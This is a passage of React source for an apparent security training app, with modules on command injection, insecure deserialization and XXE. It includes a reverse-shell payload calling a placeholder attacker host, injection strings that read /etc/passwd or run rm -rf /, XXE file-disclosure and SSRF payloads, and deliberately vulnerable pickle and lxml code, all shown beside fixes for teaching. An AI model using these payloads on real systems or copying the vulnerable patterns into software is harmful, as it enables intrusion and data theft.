                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">google.com; bash -i {'>&'} /dev/tcp/attacker/4444</code></td>
                        <td className="p-2 text-slate-300">Grants a full remote interactive shell</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <AlertCircle className="w-6 h-6 text-orange-400" />
                2. Why This Matters - Real-World Impact
              </h3>
              <div className="grid md:grid-cols-2 gap-4">
                <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-red-400 mb-2">💥 Full Server Compromise</h4>
                  <p className="text-sm text-slate-300">Arbitrary commands run with the web application's OS privileges</p>
                </div>
                <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-orange-400 mb-2">📤 Data Exfiltration</h4>
                  <p className="text-sm text-slate-300">Files, credentials, and database dumps sent to attacker servers</p>
                </div>
                <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-yellow-400 mb-2">🕳️ Persistent Access</h4>
                  <p className="text-sm text-slate-300">Reverse shells or backdoors installed for long-term access</p>
                </div>
                <div className="bg-purple-900/20 border border-purple-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-purple-400 mb-2">🌐 Lateral Movement</h4>
                  <p className="text-sm text-slate-300">Compromised server used as a pivot into the internal network</p>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Shield className="w-6 h-6 text-green-400" />
                3. How to Fix It - Best Known Methods
              </h3>
              <div className="flex gap-2 mb-4 bg-slate-700/50 p-2 rounded-lg">
                <button onClick={() => setCodeView('comparison')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'comparison' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Before/After Comparison</button>
                <button onClick={() => setCodeView('sidebyside')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'sidebyside' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Side-by-Side View</button>
              </div>
              {codeView === 'comparison' ? (
                <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4 mb-4">
                  <PythonCode code={comparisonCode} />
                </div>
              ) : (
                <div className="grid md:grid-cols-2 gap-4 mb-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-red-400 mb-3">❌ BEFORE:</h4>
                    <PythonCode code={vulnerableCode} />
                  </div>
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-3">✅ AFTER:</h4>
                    <PythonCode code={secureCode} />
                  </div>
                </div>
              )}
              <div className="bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-green-400">Command Injection Defense Checklist:</h4>
                <ul className="space-y-2 text-sm text-slate-300">
                  <li>• <strong>Avoid the Shell:</strong> Use subprocess with shell=False and an argument list</li>
                  <li>• <strong>Allowlist Input:</strong> Validate against a strict pattern (e.g., only hostname characters)</li>
                  <li>• <strong>Prefer Library APIs:</strong> Use language/library functions instead of shelling out when possible</li>
                  <li>• <strong>Least Privilege:</strong> Run the process as a low-privilege, sandboxed user</li>
                  <li>• <strong>Timeouts:</strong> Bound execution time to limit damage from runaway or malicious commands</li>
                </ul>
              </div>
            </div>

            <button onClick={() => { setActiveTab('lab'); onSectionComplete('learn'); }} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
              Continue to Interactive Lab →
            </button>
          </div>
        )}

        {activeTab === 'lab' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4">🧪 Interactive Lab: Ping Endpoint</h3>
              <p className="text-slate-300 mb-4">
                This simulates <code className="bg-slate-900 px-2 py-1 rounded">GET /ping?host=...</code> running against a vulnerable
                shell command. Try a normal hostname, then try chaining a second command.
              </p>
              <div className="bg-slate-900 rounded-lg p-6">
                <label className="block mb-2 font-semibold">host:</label>
                <div className="flex gap-3">
                  <input
                    type="text"
                    value={labInput}
                    onChange={(e) => setLabInput(e.target.value)}
                    placeholder="Try: google.com or google.com; cat /etc/passwd"
                    className="flex-1 bg-slate-800 border border-slate-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-purple-500"
                  />
                  <button onClick={handleLabSubmit} className="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-bold">Ping</button>
                </div>
              </div>

              {labResult && (
                <div className={`mt-4 rounded-lg p-4 border ${labResult.safe ? 'bg-green-900/20 border-green-500/50' : 'bg-red-900/20 border-red-500/50'}`}>
                  <p className={`font-bold ${labResult.safe ? 'text-green-400' : 'text-red-400'}`}>{labResult.message}</p>
                  {labResult.impact && <p className="text-sm text-slate-300 mt-2">{labResult.impact}</p>}
                  {labResult.leak && <pre className="bg-slate-950 rounded p-3 mt-3 text-xs text-slate-300 overflow-x-auto whitespace-pre-wrap">{labResult.leak}</pre>}
                </div>
              )}

              <button onClick={() => { setActiveTab('quiz'); onSectionComplete('lab'); }} className="w-full mt-6 bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
                Ready for the Quiz? →
              </button>
            </div>
          </div>
        )}

        {activeTab === 'quiz' && (
          <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
            <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <Trophy className="w-6 h-6 text-yellow-400" />
              Knowledge Check Quiz
            </h3>
            <Quiz questions={quizQuestions} onComplete={() => onSectionComplete('quiz')} />
          </div>
        )}
      </div>
    </div>
  );
};


// ============================================================================
// INSECURE DESERIALIZATION MODULE
// ============================================================================

const DeserializationModule = ({ onBack, onSectionComplete, completedSections }) => {
  const [activeTab, setActiveTab] = useState('learn');
  const [codeView, setCodeView] = useState('comparison');
  const [labInput, setLabInput] = useState('');
  const [labResult, setLabResult] = useState(null);

  const vulnerableCode = `from fastapi import FastAPI, Request
import pickle
import base64

app = FastAPI()

@app.post("/cart/restore")
async def restore_cart(request: Request):
    """⚠️ VULNERABLE - Deserializes untrusted pickle data"""
    body = await request.body()
    # DANGEROUS: pickle.loads executes arbitrary code embedded in the
    # byte stream via __reduce__ during deserialization - this is not
    # "parsing", it's running attacker-supplied instructions
    cart_data = pickle.loads(base64.b64decode(body))
    return {"cart": cart_data}`;

  const secureCode = `from fastapi import FastAPI
from pydantic import BaseModel

app = FastAPI()

class CartItem(BaseModel):
    product_id: int
    quantity: int

class Cart(BaseModel):
    items: list[CartItem]

@app.post("/cart/restore")
async def restore_cart(cart: Cart):
    """✅ SECURE - Uses JSON + schema validation, never pickle"""
    # SAFE: JSON has no ability to encode executable behavior, and
    # Pydantic validates the shape/types before the data is ever used
    return {"cart": cart.dict()}`;

  const comparisonCode = `from fastapi import FastAPI
from pydantic import BaseModel

app = FastAPI()

class CartItem(BaseModel):
    product_id: int
    quantity: int

class Cart(BaseModel):
    items: list[CartItem]

@app.post("/cart/restore")
async def restore_cart(cart: Cart):
    """✅ SECURE - Uses JSON + schema validation, never pickle"""

    # ❌ OLD (VULNERABLE): pickle.loads() can execute arbitrary code
    # body = await request.body()
    # cart_data = pickle.loads(base64.b64decode(body))

    # ✅ NEW (SECURE): plain data validated against an explicit schema
    return {"cart": cart.dict()}`;

  const quizQuestions = [
    {
      id: 1,
      question: "Why is Python's `pickle` module dangerous when loading untrusted input?",
      options: [
        "It's slower than JSON",
        "Loading a pickle can execute arbitrary code via special methods like __reduce__, not just restore data",
        "It only works with numbers",
        "It requires a special license for production use"
      ],
      correct: 1,
      explanation: "Pickle's format can embed instructions for reconstructing arbitrary Python objects, including ones that run code as a side effect of being 'unpickled' - deserializing untrusted pickle data is effectively running untrusted code."
    },
    {
      id: 2,
      question: "What's the recommended alternative for interchanging data with clients?",
      options: [
        "A custom binary format",
        "Plain data formats like JSON validated against an explicit schema (e.g., Pydantic models)",
        "Python's marshal module",
        "Storing everything in cookies instead"
      ],
      correct: 1,
      explanation: "JSON (or similar plain formats) has no mechanism to encode executable behavior. Combined with schema validation, it ensures the data has exactly the shape and types the application expects."
    },
    {
      id: 3,
      question: "Is YAML's `yaml.load()` safe to use on untrusted input by default?",
      options: [
        "Yes, YAML is always safe",
        "No - use yaml.safe_load(), which restricts what object types can be constructed",
        "Only if the file extension is .yml",
        "Yes, as long as the file is small"
      ],
      correct: 1,
      explanation: "The default PyYAML loader can construct arbitrary Python objects via tags like !!python/object/apply, similarly to pickle. safe_load() restricts construction to basic, safe types."
    },
    {
      id: 4,
      question: "Beyond remote code execution, what else can insecure deserialization enable?",
      options: [
        "Nothing else - it's purely a code execution issue",
        "Object/property injection, allowing privilege escalation or business logic bypass (e.g., flipping an is_admin field)",
        "Faster page loads",
        "Automatic session renewal"
      ],
      correct: 1,
      explanation: "Even without achieving code execution, a deserialized object's fields can sometimes be manipulated directly - for example, restoring a user object with a tampered role or permission flag."
    }
  ];

  const handleLabSubmit = () => {
    const suspiciousMarkers = ['__reduce__', 'os.system', 'subprocess', 'eval(', '__import__', 'os.popen'];
    const found = suspiciousMarkers.filter(m => labInput.includes(m));

    if (found.length > 0) {
      setLabResult({
        safe: false,
        message: "🚨 Malicious Payload Detected!",
        impact: `pickle.loads() doesn't just read data - it executes the reconstruction instructions embedded in the payload. The marker(s) ${found.join(', ')} indicate this payload would trigger code execution the instant it's deserialized, before your application logic even runs.`
      });
    } else {
      try {
        const parsed = JSON.parse(labInput);
        setLabResult({
          safe: true,
          message: "✅ Valid JSON Cart Restored",
          impact: `Parsed safely: ${JSON.stringify(parsed)}. JSON has no way to embed executable behavior, so this is inert no matter what a malicious user submits.`
        });
      } catch {
        setLabResult({
          safe: true,
          message: "❌ Not valid JSON",
          impact: "This input isn't valid JSON and would simply be rejected by schema validation - no code runs either way."
        });
      }
    }
    onSectionComplete('lab');
  };

  const progressPercent = (Object.keys(completedSections).length / 3) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
      <div className="max-w-6xl mx-auto">
        <button onClick={onBack} className="flex items-center gap-2 mb-6 text-slate-400 hover:text-white transition-all">
          <Home className="w-5 h-5" /> Back to Modules
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-3 mb-4">
            <PackageX className="w-10 h-10 text-purple-400" />
            <h1 className="text-4xl font-bold">Insecure Deserialization</h1>
          </div>
          <div className="bg-slate-800 rounded-lg p-4">
            <div className="flex justify-between items-center mb-2">
              <span className="text-sm text-slate-400">Module Progress</span>
              <span className="text-sm font-bold text-purple-400">{Math.round(progressPercent)}%</span>
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all duration-500" style={{ width: `${progressPercent}%` }} />
            </div>
          </div>
        </div>

        <div className="flex gap-2 mb-6 bg-slate-800/50 p-2 rounded-lg">
          {[
            { id: 'learn', label: 'Learn', icon: BookOpen },
            { id: 'lab', label: 'Interactive Lab', icon: Terminal },
            { id: 'quiz', label: 'Quiz', icon: Trophy }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg transition-all ${
                activeTab === tab.id ? 'bg-purple-600 text-white shadow-lg' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'
              }`}
            >
              <tab.icon className="w-5 h-5" />
              {tab.label}
              {completedSections[tab.id] && <CheckCircle className="w-4 h-4 text-green-400" />}
            </button>
          ))}
        </div>

        {activeTab === 'learn' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Code className="w-6 h-6 text-purple-400" />
                1. Understanding the Vulnerability
              </h3>
              <p className="text-slate-300 mb-4">
                Insecure deserialization occurs when an application reconstructs objects from untrusted data using formats that can
                embed executable behavior - most notably Python's pickle. Deserializing such data isn't just parsing; it's running
                instructions the attacker controls.
              </p>

              <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-red-400 mb-2">❌ Vulnerable Code Example:</h4>
                <PythonCode code={vulnerableCode} />
              </div>

              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold mb-3">Attack Examples - Try These in the Lab:</h4>
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-slate-700">
                        <th className="text-left p-2 text-purple-400">Attack Type</th>
                        <th className="text-left p-2 text-purple-400">Technique</th>
                        <th className="text-left p-2 text-purple-400">Impact</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Pickle RCE Payload</td>
                        <td className="p-2 text-slate-300">Crafted object whose __reduce__ returns (os.system, (cmd,))</td>
                        <td className="p-2 text-slate-300">Executes an arbitrary shell command the instant pickle.loads() runs</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Unsafe YAML Load</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">yaml.load()</code> with a python/object/apply tag</td>
                        <td className="p-2 text-slate-300">Same RCE outcome via YAML's Python object tags</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-orange-400">Gadget Chains</td>
                        <td className="p-2 text-slate-300">Chaining legitimate classes together during reconstruction</td>
                        <td className="p-2 text-slate-300">Achieves code execution even without an obvious "eval"</td>
                      </tr>
                      <tr>
                        <td className="p-2 font-semibold text-orange-400">Object Property Injection</td>
                        <td className="p-2 text-slate-300">Serialized object with a flipped is_admin field</td>
                        <td className="p-2 text-slate-300">Privilege escalation without any code execution needed</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <AlertCircle className="w-6 h-6 text-orange-400" />
                2. Why This Matters - Real-World Impact
              </h3>
              <div className="grid md:grid-cols-2 gap-4">
                <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-red-400 mb-2">💥 Remote Code Execution</h4>
                  <p className="text-sm text-slate-300">Deserializing a payload can run arbitrary code immediately</p>
                </div>
                <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-orange-400 mb-2">👑 Privilege Escalation</h4>
                  <p className="text-sm text-slate-300">Tampered object fields grant admin rights without a password</p>
                </div>
                <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-yellow-400 mb-2">🐢 Denial of Service</h4>
                  <p className="text-sm text-slate-300">Crafted objects trigger huge resource consumption on load</p>
                </div>
                <div className="bg-purple-900/20 border border-purple-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-purple-400 mb-2">🖥️ Full System Compromise</h4>
                  <p className="text-sm text-slate-300">RCE on a backend service often means total server takeover</p>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Shield className="w-6 h-6 text-green-400" />
                3. How to Fix It - Best Known Methods
              </h3>
              <div className="flex gap-2 mb-4 bg-slate-700/50 p-2 rounded-lg">
                <button onClick={() => setCodeView('comparison')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'comparison' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Before/After Comparison</button>
                <button onClick={() => setCodeView('sidebyside')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'sidebyside' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Side-by-Side View</button>
              </div>
              {codeView === 'comparison' ? (
                <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4 mb-4">
                  <PythonCode code={comparisonCode} />
                </div>
              ) : (
                <div className="grid md:grid-cols-2 gap-4 mb-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-red-400 mb-3">❌ BEFORE:</h4>
                    <PythonCode code={vulnerableCode} />
                  </div>
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-3">✅ AFTER:</h4>
                    <PythonCode code={secureCode} />
                  </div>
                </div>
              )}
              <div className="bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-green-400">Deserialization Defense Checklist:</h4>
                <ul className="space-y-2 text-sm text-slate-300">
                  <li>• <strong>Never Unpickle Untrusted Data:</strong> Treat pickle as a code execution format, not a data format</li>
                  <li>• <strong>Use JSON + Schema Validation:</strong> Pydantic (or similar) enforces types and shape before use</li>
                  <li>• <strong>yaml.safe_load(), Not yaml.load():</strong> Restrict YAML to plain data types</li>
                  <li>• <strong>Sign or Encrypt if You Must Serialize State:</strong> Detect tampering before deserializing anything custom</li>
                  <li>• <strong>Keep Dependencies Updated:</strong> Known gadget chains are patched in libraries over time</li>
                </ul>
              </div>
            </div>

            <button onClick={() => { setActiveTab('lab'); onSectionComplete('learn'); }} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
              Continue to Interactive Lab →
            </button>
          </div>
        )}

        {activeTab === 'lab' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4">🧪 Interactive Lab: Cart Restore Endpoint</h3>
              <p className="text-slate-300 mb-4">
                This simulates <code className="bg-slate-900 px-2 py-1 rounded">POST /cart/restore</code>. Try a normal JSON cart, then
                try a payload containing pickle-style markers like <code className="bg-slate-900 px-2 py-1 rounded">__reduce__</code> or{' '}
                <code className="bg-slate-900 px-2 py-1 rounded">os.system</code>.
              </p>
              <div className="bg-slate-900 rounded-lg p-6">
                <label className="block mb-2 font-semibold">request body:</label>
                <div className="flex gap-3">
                  <input
                    type="text"
                    value={labInput}
                    onChange={(e) => setLabInput(e.target.value)}
                    placeholder={'Try: {"items":[{"product_id":1,"quantity":2}]}  or  __reduce__ os.system(rm -rf /)'}
                    className="flex-1 bg-slate-800 border border-slate-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-purple-500"
                  />
                  <button onClick={handleLabSubmit} className="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-bold">Restore Cart</button>
                </div>
              </div>

              {labResult && (
                <div className={`mt-4 rounded-lg p-4 border ${labResult.safe ? 'bg-green-900/20 border-green-500/50' : 'bg-red-900/20 border-red-500/50'}`}>
                  <p className={`font-bold ${labResult.safe ? 'text-green-400' : 'text-red-400'}`}>{labResult.message}</p>
                  <p className="text-sm text-slate-300 mt-2">{labResult.impact}</p>
                </div>
              )}

              <button onClick={() => { setActiveTab('quiz'); onSectionComplete('lab'); }} className="w-full mt-6 bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
                Ready for the Quiz? →
              </button>
            </div>
          </div>
        )}

        {activeTab === 'quiz' && (
          <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
            <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <Trophy className="w-6 h-6 text-yellow-400" />
              Knowledge Check Quiz
            </h3>
            <Quiz questions={quizQuestions} onComplete={() => onSectionComplete('quiz')} />
          </div>
        )}
      </div>
    </div>
  );
};


// ============================================================================
// XML EXTERNAL ENTITIES (XXE) MODULE
// ============================================================================

const XXEModule = ({ onBack, onSectionComplete, completedSections }) => {
  const [activeTab, setActiveTab] = useState('learn');
  const [codeView, setCodeView] = useState('comparison');
  const [labInput, setLabInput] = useState('');
  const [labResult, setLabResult] = useState(null);

  const vulnerableCode = `from fastapi import FastAPI, Request
from lxml import etree

app = FastAPI()

@app.post("/import/xml")
async def import_xml(request: Request):
    """⚠️ VULNERABLE - Parser resolves external entities"""
    body = await request.body()
    # DANGEROUS: resolve_entities=True lets a DOCTYPE/ENTITY
    # declaration pull in local files or make outbound requests
    parser = etree.XMLParser(resolve_entities=True)
    tree = etree.fromstring(body, parser)
    return {"root_tag": tree.tag}`;

  const secureCode = `from fastapi import FastAPI, HTTPException, Request
from lxml import etree

app = FastAPI()

@app.post("/import/xml")
async def import_xml(request: Request):
    """✅ SECURE - Disables external entity and DTD resolution"""
    body = await request.body()

    # SAFE: explicitly disable external entities, network access,
    # and DTD processing at the parser level
    parser = etree.XMLParser(
        resolve_entities=False,
        no_network=True,
        dtd_validation=False,
        load_dtd=False,
        huge_tree=False
    )
    try:
        tree = etree.fromstring(body, parser)
    except etree.XMLSyntaxError:
        raise HTTPException(400, "Invalid XML")

    return {"root_tag": tree.tag}`;

  const comparisonCode = `from fastapi import FastAPI, HTTPException, Request
from lxml import etree

app = FastAPI()

@app.post("/import/xml")
async def import_xml(request: Request):
    """✅ SECURE - Disables external entity and DTD resolution"""
    body = await request.body()

    # ❌ OLD (VULNERABLE): resolve_entities=True
    # parser = etree.XMLParser(resolve_entities=True)

    # ✅ NEW (SECURE): entities, network access, and DTDs all disabled
    parser = etree.XMLParser(
        resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False
    )
    try:
        tree = etree.fromstring(body, parser)
    except etree.XMLSyntaxError:
        raise HTTPException(400, "Invalid XML")

    return {"root_tag": tree.tag}`;

  const quizQuestions = [
    {
      id: 1,
      question: "What XML feature does XXE abuse?",
      options: [
        "XML namespaces",
        "DTDs (Document Type Definitions) and external entity declarations that can reference local files or URLs",
        "XML comments",
        "CDATA sections"
      ],
      correct: 1,
      explanation: "A DOCTYPE can declare a custom ENTITY pointing at a file:// path or a URL. If the parser resolves it, that content gets substituted into the document."
    },
    {
      id: 2,
      question: "What is the single most effective way to prevent XXE?",
      options: [
        "Encrypting the XML payload",
        "Disabling DTD processing and external entity resolution in the XML parser entirely",
        "Requiring authentication before parsing",
        "Compressing the XML before sending it"
      ],
      correct: 1,
      explanation: "If the parser never processes DTDs or resolves external entities in the first place, there's no mechanism left for an attacker to abuse - regardless of how the payload is crafted."
    },
    {
      id: 3,
      question: "Can XXE be used for SSRF (Server-Side Request Forgery)?",
      options: [
        "No, XXE only reads local files",
        "Yes - an external entity pointing at an internal URL forces the server to fetch it",
        "Only if the server has no firewall",
        "Only in XML versions before 1.0"
      ],
      correct: 1,
      explanation: "An ENTITY declared as SYSTEM \"http://internal-service/admin\" makes the XML parser itself issue that request, effectively turning the parser into an SSRF vector."
    },
    {
      id: 4,
      question: "What is the 'Billion Laughs' attack?",
      options: [
        "A phishing technique using humorous emails",
        "A form of entity-expansion denial of service where nested entity references expand exponentially, exhausting memory/CPU",
        "A SQL injection variant",
        "A CSRF technique involving multiple forms"
      ],
      correct: 1,
      explanation: "Each entity is defined in terms of several copies of the previous one. A handful of definitions can expand to billions of characters in memory when resolved, crashing the parser/process."
    }
  ];

  const handleLabSubmit = () => {
    const input = labInput;
    const hasDoctype = /<!DOCTYPE/i.test(input);
    const hasEntity = /<!ENTITY/i.test(input) || /&\w+;/.test(input);
    const hasSystem = /SYSTEM/i.test(input);

    if (hasDoctype && (hasEntity || hasSystem)) {
      let leak = 'root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash';
      let impact = "🔓 CRITICAL: The parser resolved your external entity and substituted the referenced content directly into the response.";
      if (/http:\/\/|internal|169\.254/i.test(input)) {
        leak = '[simulated] outbound HTTP request issued to internal-only host from the server itself';
        impact = "🌐 SSRF via XXE: The entity pointed at an internal URL, so the XML parser made the request on the server's behalf - reaching hosts that aren't exposed to the internet.";
      }
      setLabResult({ safe: false, message: "⚠️ XXE Detected!", impact, leak });
    } else {
      let tag = 'unknown';
      const match = input.match(/<(\w+)/);
      if (match) tag = match[1];
      setLabResult({ safe: true, message: `✅ Parsed normally - root tag: <${tag}>`, impact: "No DOCTYPE/ENTITY declarations found, so there was nothing for the parser to resolve.", leak: null });
    }
    onSectionComplete('lab');
  };

  const progressPercent = (Object.keys(completedSections).length / 3) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
      <div className="max-w-6xl mx-auto">
        <button onClick={onBack} className="flex items-center gap-2 mb-6 text-slate-400 hover:text-white transition-all">
          <Home className="w-5 h-5" /> Back to Modules
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-3 mb-4">
            <FileWarning className="w-10 h-10 text-orange-400" />
            <h1 className="text-4xl font-bold">XML External Entities (XXE)</h1>
          </div>
          <div className="bg-slate-800 rounded-lg p-4">
            <div className="flex justify-between items-center mb-2">
              <span className="text-sm text-slate-400">Module Progress</span>
              <span className="text-sm font-bold text-purple-400">{Math.round(progressPercent)}%</span>
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all duration-500" style={{ width: `${progressPercent}%` }} />
            </div>
          </div>
        </div>

        <div className="flex gap-2 mb-6 bg-slate-800/50 p-2 rounded-lg">
          {[
            { id: 'learn', label: 'Learn', icon: BookOpen },
            { id: 'lab', label: 'Interactive Lab', icon: Terminal },
            { id: 'quiz', label: 'Quiz', icon: Trophy }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg transition-all ${
                activeTab === tab.id ? 'bg-purple-600 text-white shadow-lg' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'
              }`}
            >
              <tab.icon className="w-5 h-5" />
              {tab.label}
              {completedSections[tab.id] && <CheckCircle className="w-4 h-4 text-green-400" />}
            </button>
          ))}
        </div>

        {activeTab === 'learn' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Code className="w-6 h-6 text-purple-400" />
                1. Understanding the Vulnerability
              </h3>
              <p className="text-slate-300 mb-4">
                XXE occurs when an XML parser processes a Document Type Definition (DTD) that declares external entities. If the parser
                resolves these entities, an attacker can make the server read local files, issue internal network requests, or exhaust
                resources - all just by submitting crafted XML.
              </p>

              <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-red-400 mb-2">❌ Vulnerable Code Example:</h4>
                <PythonCode code={vulnerableCode} />
              </div>

              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold mb-3">Attack Examples - Try These in the Lab:</h4>
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-slate-700">
                        <th className="text-left p-2 text-purple-400">Attack Type</th>
                        <th className="text-left p-2 text-purple-400">Payload</th>
                        <th className="text-left p-2 text-purple-400">Impact</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">File Disclosure</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300 text-xs">{'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'}</code></td>
                        <td className="p-2 text-slate-300">Embeds a local file's contents into the parsed response</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">SSRF via Entity</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300 text-xs">{'<!ENTITY xxe SYSTEM "http://internal-service:8080/admin">'}</code></td>
                        <td className="p-2 text-slate-300">Forces the server to request an internal-only URL</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-orange-400">Billion Laughs</td>
                        <td className="p-2 text-slate-300">Nested entities each referencing the previous ~10x</td>
                        <td className="p-2 text-slate-300">Exponential memory/CPU blowup, crashing the service</td>
                      </tr>
                      <tr>
                        <td className="p-2 font-semibold text-orange-400">Out-of-Band Exfiltration</td>
                        <td className="p-2 text-slate-300">Parameter entities leaking data via attacker-controlled DNS/HTTP</td>
                        <td className="p-2 text-slate-300">Works even when the response isn't directly reflected</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <AlertCircle className="w-6 h-6 text-orange-400" />
                2. Why This Matters - Real-World Impact
              </h3>
              <div className="grid md:grid-cols-2 gap-4">
                <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-red-400 mb-2">📄 Local File Disclosure</h4>
                  <p className="text-sm text-slate-300">Reads server files the application never intended to expose</p>
                </div>
                <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-orange-400 mb-2">🌐 Internal SSRF</h4>
                  <p className="text-sm text-slate-300">Pivots into the internal network via the parser's requests</p>
                </div>
                <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-yellow-400 mb-2">🐢 Denial of Service</h4>
                  <p className="text-sm text-slate-300">Entity expansion attacks exhaust memory/CPU</p>
                </div>
